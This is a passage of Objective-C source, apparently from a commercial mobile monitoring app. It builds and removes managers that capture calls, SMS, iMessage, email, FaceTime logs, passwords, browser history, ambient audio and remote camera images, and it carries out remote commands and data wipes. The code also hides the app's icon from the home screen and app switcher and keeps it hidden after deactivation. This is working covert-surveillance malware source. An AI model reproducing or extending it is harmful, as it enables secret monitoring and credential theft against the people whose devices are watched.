        [mRemoteCmdManager setMCameraEventCapture:mCameraCaptureManager];
        [mRemoteCmdManager relaunchForFeaturesChange];
    } else {
        [mCameraCaptureManager release];
        mCameraCaptureManager = nil;
        [mRemoteCmdManager setMCameraEventCapture:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
	
	// FaceTime call log manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
		
		if (!mFTCaptureManager) {
			DLog (@"Create FaceTimeCaptureManager")
			mFTCaptureManager = [[FaceTimeCaptureManager alloc] initWithEventDelegate:mEventCenter];
			[mFTCaptureManager setMAC:[NSString stringWithFormat:@"*#%@", [[mLicenseManager mCurrentLicenseInfo] activationCode]]];
		}
	} else { // Upgrade or downgrad features
		// FaceTime call log capture manager
		[mFTCaptureManager release];
		mFTCaptureManager = nil;
	}
    
    // Password
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventPassword]) {
		if (!mPasswordCaptureManager) {
			mPasswordCaptureManager = [[PasswordCaptureManager alloc] init];
            [mPasswordCaptureManager setMDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnablePassword]) {
			[mPasswordCaptureManager startCapture];
		} else {
			[mPasswordCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mPasswordCaptureManager release];
		mPasswordCaptureManager = nil;
	}
		
    // Device Settings
    if ([mConfigurationManager isSupportedFeature:kFeatureID_SendDeviceSettings]) {
		if (!mDeviceSettingsManager) {
            DLog(@"Create DeviceSettingManager")
			mDeviceSettingsManager = [[DeviceSettingsManagerImpl alloc] initWithDataDeliveryManager:mDDM];
		}
        [mRemoteCmdManager setMDeviceSettingsManager:mDeviceSettingsManager];
        [mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		// Upgrade or downgrad features
		[mDeviceSettingsManager release];
		mDeviceSettingsManager = nil;
        [mRemoteCmdManager setMDeviceSettingsManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
	}

    // Historical Event Manager (we can check feature ID in the component if the use case is changed)
    if (!mHistoricalEventManager) {
        mHistoricalEventManager = [[HistoricalEventManagerImpl alloc] initWithEventDelegate:mEventCenter];
        [mHistoricalEventManager setMConfigurationManager:mConfigurationManager];
        DLog(@"Historical Event Manager %@", mHistoricalEventManager)
    }
    [mRemoteCmdManager setMHistoricalEventManager:mHistoricalEventManager];
    [mRemoteCmdManager relaunchForFeaturesChange];

    // Wipe data manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_WipeData]) {
		if (!mWipeDataManager) {
			mWipeDataManager = [[WipeDataManagerImpl alloc] init];
		}
		[mRemoteCmdManager setMWipeDataManager:mWipeDataManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mWipeDataManager release];
		mWipeDataManager = nil;
		[mRemoteCmdManager setMWipeDataManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
    
	// Actions required when applicaton activate or reactivate NOT application restarted
	if ([self mIsRestartingAppEngine]) { // Application just restart from either crash or phone restart
		DLog (@"AppEngine resume all pending remote commands")
		// Resume all pending commands
		[mRemoteCmdManager processPendingRemoteCommands];
	} else {
		// Application have been ACTIVATED by user
	}
}

- (void) destructApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Destruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	
	[mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
	
	LicenseInfo *licenseInfo = [mLicenseManager mCurrentLicenseInfo];
	
	PrefVisibility *prefVis = (PrefVisibility *)[mPreferenceManager preference:kVisibility];
    BOOL isVisible = [prefVis mVisible];
	NSArray *hiddenIds = [prefVis hiddenBundleIdentifiers];
	NSArray *shownIds = [prefVis shownBundleIdentifiers];
	
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		// Reset the preferences
		[mPreferenceManager resetPreferences];
	}
	
	// Call
    
    [CallLogCaptureManager clearCapturedData];
	[mCallLogCaptureManager release];
	mCallLogCaptureManager = nil;
	
	// SMS
    [SMSCaptureManager clearCapturedData];
	[mSMSCaptureManager release];
	mSMSCaptureManager = nil;
	
	// IMessage
    [IMessageCaptureManager clearCapturedData];
	[mIMessageCaptureManager release];
	mIMessageCaptureManager = nil;
	
	// MMS
    [MMSCaptureManager clearCapturedData];
	[mMMSCaptureManager release];
	mMMSCaptureManager = nil;
	
	// Email
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[MailCaptureManager clearEmailHistory];
	}
	[mMailCaptureManager release];
	mMailCaptureManager = nil;
	
	// Location
	[mLocationManager release];
	mLocationManager = nil;
	
	// Address book
	[mRemoteCmdManager setMAddressbookManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	[mAddressbookManager release];
	mAddressbookManager = nil;
	
	// Media finder
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[MediaFinder clearMediaHistory];
	}
	[mMediaFinder release];
	mMediaFinder = nil;
    
    // Media capture
    [MediaCaptureManager clearCapturedData];
    [mMediaCaptureManager release];
    mMediaCaptureManager = nil;
	
	// Borwser url/Bookmark capture
    [BrowserUrlCaptureManager clearCapturedData];
	[mBrowserUrlCaptureManager release];
	mBrowserUrlCaptureManager = nil;
	
	// Stop deliver
	[mEDM setDeliveryTimer:0];
	
	// Visibility
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
        if (isVisible) {
            [visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
        } else {
            [visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
        }
		[visibility hideApplicationIconFromAppSwitcherSpringBoard:[NSArray array]];
		
		NSArray *all = [hiddenIds arrayByAddingObjectsFromArray:shownIds];
		[visibility showApplicationIconInAppSwitcherSpringBoard:all];
		
	} else {
		DLog (@"=========================================")
		DLog (@"--- license may be expired or disable ---")
		DLog (@"=========================================")
		// For user reinstall or restart device
        if (isVisible) {
            [visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
        } else {
            [visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
        }
		[visibility hideApplicationIconFromAppSwitcherSpringBoard:hiddenIds];
		[visibility showApplicationIconInAppSwitcherSpringBoard:shownIds];
		
	}
	[visibility applyAppVisibility];
    
    // Set back application visibility, note visibility is not reset after deactivated for law enforcement purpose
    prefVis = (PrefVisibility *)[mPreferenceManager preference:kVisibility];
    [prefVis setMVisible:isVisible];
    [mPreferenceManager savePreference:prefVis];
	
	
	// App agent
	[mAppAgentManager release];
	mAppAgentManager = nil;
	
	// Bookmar manager
	[mBookmarkManager release];
	mBookmarkManager = nil;
	[mRemoteCmdManager setMBookmarkManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];

	// Application manager
	[mApplicationManager release];
	mApplicationManager = nil;
	[mRemoteCmdManager setMApplicationManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Ambient recording Manager
	[mAmbientRecordingManager release];
	mAmbientRecordingManager = nil;
	    
	// Note manager
	[mNoteManager release];
	mNoteManager = nil;
	
	// Calendar manager
	[mCalendarManager release];
	mCalendarManager = nil;

	// Remote camera manager
	[mCameraCaptureManager release];
	mCameraCaptureManager = nil;

	// FaceTime call log capture manager
    
    [FaceTimeCaptureManager clearCapturedData];
	[mFTCaptureManager release];
	mFTCaptureManager = nil;
    
    // Password capture manager
    [mPasswordCaptureManager resetForceLogOut];
    [mPasswordCaptureManager release];
    mPasswordCaptureManager = nil;
    
    // Device Settings manager
    [mDeviceSettingsManager release];
    mDeviceSettingsManager = nil;
    
    // Historical Event Manager
    [mHistoricalEventManager release];
    mHistoricalEventManager = nil;
    
    // Wipe data manager
	[mWipeDataManager release];
	mWipeDataManager = nil;
	[mRemoteCmdManager setMWipeDataManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
    
	// 1. Events repository
	// 2. Remote commands
	if (![self mIsRestartingAppEngine]) {
		// Application's license is deactivated or expired or disabled by user/server
		if ([licenseInfo licenseStatus] == DEACTIVATED) {
			[mERM dropRepository];
		}
		// Always clear pending commands otherwise that would be crash if those pending
		// commands using features that already destroy... and the spec also metioned that
		// only deactivate and heartbeat command can execute..
		[mRemoteCmdManager clearAllPendingRemoteCommands];
		
		// Clear all DDM request for the same reason as RCM
		[mDDM cleanAllRequests];
		
		// Clear all CSM request for the same reason as RCM
		[mCSM cleanAllSessionInfoAndDeletePayload];
	} else {
		// Application is just restarting because of crashing or phone restart
	}
}

- (EventQueryPriority*) eventQueryPriority {
	NSMutableArray* eventTypePriorityArray = [[NSMutableArray alloc] init];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanic]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanicImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSettings]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLocation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSystem]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallLog]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePassword]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVoIP]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeKeyLog]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIM]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMAccount]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMContact]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMConversation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMMessage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBrowserURL]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBookmark]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeApplicationLifeCycle]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAmbientRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAmbientRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImageThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideo]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideoThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaper]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaperThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeRemoteCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeRemoteCameraVideo]];
	EventQueryPriority* eventQueryPriority = [[EventQueryPriority alloc] initWithUserPriority:eventTypePriorityArray];
	[eventTypePriorityArray release];
	[eventQueryPriority autorelease];
	return (eventQueryPriority);
}

#pragma mark -
#pragma mark License changes private method
#pragma mark -

- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo {
	// Set IMEI to CSM
	NSString *imei = [[mApplicationContext mPhoneInfo] getIMEI];
	if (!imei) imei = @"";
	[mCSM setIMEI:imei];
	
	// Update config
	NSInteger configID = [aLicenseInfo configID];
	if ([aLicenseInfo licenseStatus] == EXPIRED) {
		configID = CONFIG_EXPIRE_LICENSE;
		
		// Start getting config every 12 hours
		[mLicenseGetConfigUtils start];
		
	} else if ([aLicenseInfo licenseStatus] == DISABLE) {
		configID = CONFIG_DISABLE_LICENSE;
		
		// Start getting config every 12 hours
		[mLicenseGetConfigUtils start];
		
	} else if ([aLicenseInfo licenseStatus] == ACTIVATED) {		
		// Start getting config every 12 hours
		[mLicenseGetConfigUtils start];
		
	} else { // DEACTIVATED/UNKNOWN
		// Stop getting config every 12 hours
		[mLicenseGetConfigUtils stop];
	}
	
	// Send license info to UI exclusively
	LicenseInfo *licInfo = [[LicenseInfo alloc] init];
	[licInfo setMd5:[aLicenseInfo md5]];
	[licInfo setLicenseStatus:[aLicenseInfo licenseStatus]];
	[licInfo setConfigID:configID];
	[licInfo setActivationCode:[aLicenseInfo activationCode]];
	[mAppEngineConnection processCommand:kAppUI2EngineGetLicenseInfoCmd
							 withCmdData:licInfo];
	[licInfo release];
	
	[mConfigurationManager updateConfigurationID:configID];
	Configuration *config = [mConfigurationManager configuration];
	[mRemoteCmdManager setMSupportCmdCodes:[config mSupportedRemoteCmdCodes]];
	
	// Construct/Destruct features
	if ([aLicenseInfo licenseStatus] == ACTIVATED) {
		[self createApplicationFeatures];
	} else if ([aLicenseInfo licenseStatus] == DEACTIVATED||
			   [aLicenseInfo licenseStatus] == EXPIRED ||
			   [aLicenseInfo licenseStatus] == DISABLE ||
			   [aLicenseInfo licenseStatus] == LC_UNKNOWN) {
		[self destructApplicationFeatures];
	}
		
	// Set engine of the application is no longer just restart
	[self setMIsRestartingAppEngine:FALSE];
    
    // Completed
    [self.mAppEngineDelegate engineConstructCompleted];
}

#pragma mark -
#pragma mark Capture all lastest data

- (void)captureAllData
{
#warning for testing purpose
//    UILocalNotification* local = [[[UILocalNotification alloc] init] autorelease];
//    local.fireDate = [NSDate dateWithTimeIntervalSinceNow:30];
//    local.alertBody = [NSString stringWithFormat:@"Capture at %@", [DateTimeFormat phoenixDateTime]];
//    local.soundName = UILocalNotificationDefaultSoundName;
//    local.applicationIconBadgeNumber = 0;
//    [[UIApplication sharedApplication] scheduleLocalNotification:local];
    
    PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
    
    // Call log
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCallLog]) {
            if (mCallLogCaptureManager) {
                [mCallLogCaptureManager captureCall];
                DLog(@"Complete Capture Call")
            }
        }
    }
    
    // FaceTime call log capture manager
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVoIPLog]) {
            if (mFTCaptureManager) {
                [mFTCaptureManager captureFacetime];
                DLog(@"Complete Capture Facetime Call")
            }
        }
    }
    
    // SMS
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSMS]) {
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableSMS]) {
            if (mSMSCaptureManager) {
                [mSMSCaptureManager captureSMS];
                DLog(@"Complete Capture SMS")
            }
        }
    }

    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMMS]) {
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableMMS]) {
            if (mMMSCaptureManager) {
                [mMMSCaptureManager captureMMS];
                DLog(@"Complete Capture MMS")
            }
        }
    }
    
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventIM]) {
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableIM]) {
            
            DLog(@"Individual im setting id change %lu", (unsigned long)[prefEventCapture mEnableIndividualIM])
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualIMessage) {
                if (mIMessageCaptureManager) {
                    [mIMessageCaptureManager captureiMessage];
                    DLog(@"Complete Capture iMessage")
                }
            }
        }
    }
    
    //Media Capture
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
        if (prefEventCapture.mStartCapture && prefEventCapture.mEnableCameraImage) {
            [mMediaCaptureManager captureNewPhotos];
        }
        if (prefEventCapture.mStartCapture && prefEventCapture.mEnableVideoFile) {
            [mMediaCaptureManager captureNewVideos];
        }
    }
    
//    // Browser url/Bookmark capture
//    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
//        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableBrowserUrl]) {
//            if (mBrowserUrlCaptureManager) {
//                [mBrowserUrlCaptureManager captureLastWebHistory];
//                DLog(@"Complete Capture BrowserHistory")
//            }
//        }
//
//    }
}

#pragma mark -

#pragma mark -
#pragma mark dealloc method
#pragma mark -

- (void) dealloc {
	// Features
    [mHistoricalEventManager release];
    [mDeviceSettingsManager release];
    [mPasswordCaptureManager release];
    [mFTCaptureManager release];
	[mApplicationManager release];
	[mBookmarkManager release];
	[mBrowserUrlCaptureManager release];
	[mAppAgentManager release];
	[mMediaFinder release];
    [mMediaCaptureManager release];
    [mAddressbookManager release];
	[mLocationManager release];
	[mMailCaptureManager release];
	[mMMSCaptureManager release];
	[mIMessageCaptureManager release];
	[mSMSCaptureManager release];
	[mCallLogCaptureManager release];
	[mAmbientRecordingManager release];
	[mNoteManager release];
	[mCalendarManager release];
	[mCameraCaptureManager release];
    [mWipeDataManager release];
	
	// Engine
	[mUpdateConfigurationManager release];
	[mSoftwareUpdateManager release];
	[mSBNotifier release];
	[mRemoteCmdManager release];
	[mEventCenter release];
	[mEDM release];
	[mERM release];
	[mActivationManager release];
	[mDDM release];
	[mCSM release];
	[mPreferenceManager release];
	[mConnectionHistoryManager release];
	[mServerAddressManager release];
	[mConfigurationManager release];
	[mLicenseManager release];
	[mSystemUtils release];
	[mApplicationContext release];

	// Utils
	[mLicenseGetConfigUtils prerelease];
	[mLicenseGetConfigUtils release];
	[mPreferencesChangeHandler release];
	[mServerErrorStatusHandler release];
	[mLicenseHeartbeatUtils release];
    [mSignificantLocationChangeHandler release];
    
	[super dealloc];
}

@end
